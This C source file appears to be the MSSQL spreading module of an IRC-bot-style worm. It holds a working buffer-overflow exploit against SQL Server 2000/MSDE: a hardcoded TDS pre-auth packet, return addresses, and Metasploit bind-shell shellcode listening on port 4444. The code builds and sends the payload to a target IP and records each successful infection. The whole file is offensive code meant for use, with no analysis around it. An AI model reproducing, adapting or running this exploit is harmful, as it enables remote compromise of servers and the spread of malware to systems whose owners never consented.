
#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_MSSQL

char hello[]=
	"\x12\x01\x00\x34\x00\x00\x00\x00\x00\x00\x15\x00\x06\x01\x00\x1b"
	"\x00\x01\x02\x00\x1c\x00\x0c\x03\x00\x28\x00\x04\xff\x08\x00\x02"
	"\x10\x00\x00\x00";

/* win32_bind -  EXITFUNC=seh LPORT=4444 Size=317 Encoder=None http://metasploit.com */
unsigned char scode[] =
"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
"\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
"\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
"\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
"\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
"\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
"\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0";


bool MSSQLPreAuth(EXINFO exinfo) {

	/*Microsoft SQL Server 2000 / MSDE 2000*/
	unsigned long retaddr[] ={
		0x42b68aba, 
		0x42d01e50
	};

	char *szRequest=(char*)malloc(sizeof(hello)+528+(4*8)+88+sizeof(scode)+5);

	unsigned int iPos=0;
	memcpy(szRequest+0, hello, sizeof(hello)			); iPos+=sizeof(hello);
	memset(szRequest+iPos, 'M', 528						); iPos+=528;
	memcpy(szRequest+iPos, "\x1B\xA5\xEE\x34", 4		); iPos+=4;
	memcpy(szRequest+iPos, "CCCC", 4					); iPos+=4;
	memcpy(szRequest+iPos, &retaddr[0], 4				); iPos+=4;
	memcpy(szRequest+iPos, &retaddr[1], 4				); iPos+=4;
	memcpy(szRequest+iPos, &retaddr[1], 4				); iPos+=4;
	memcpy(szRequest+iPos, "3333", 4					); iPos+=4;
	memcpy(szRequest+iPos, &retaddr[1], 4				); iPos+=4;
	memcpy(szRequest+iPos, &retaddr[1], 4				); iPos+=4;
	memset(szRequest+iPos, 'A', 88						); iPos+=88;
	memcpy(szRequest+iPos, scode, sizeof(scode)			); iPos+=sizeof(scode);
	memcpy(szRequest+iPos, "\x00\x24\x01\x00\x00", 5	); iPos+=5;
	unsigned int iReqSize = iPos;

	SOCKET ssock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(ssock == INVALID_SOCKET) {
		free(szRequest);
		return false;
	}

	SOCKADDR_IN ssin;
	ssin.sin_family = AF_INET;
	ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
	ssin.sin_port = fhtons((unsigned short)exinfo.port);

	if(fconnect(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
		free(szRequest);
		return false;
	}

	if (fsend(ssock, szRequest, iReqSize, 0) == SOCKET_ERROR) {
		fclosesocket(ssock);
		free(szRequest);
		return false;
	}

	fclosesocket(ssock);
	free(szRequest);

	return (AddEx(exinfo, true));

}
#endif